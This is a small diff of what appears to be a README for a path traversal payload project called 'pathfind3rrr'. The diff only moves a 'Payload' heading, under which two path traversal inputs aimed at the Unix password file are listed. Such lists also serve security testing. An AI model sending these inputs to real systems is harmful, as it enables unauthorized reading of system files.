@@ -1,6 +1,6 @@
 # pathfind3rrr
-Path Traversal
-Payload:
 
+
+# Payload:
 ../../../etc/passwd
 /etc/passwd
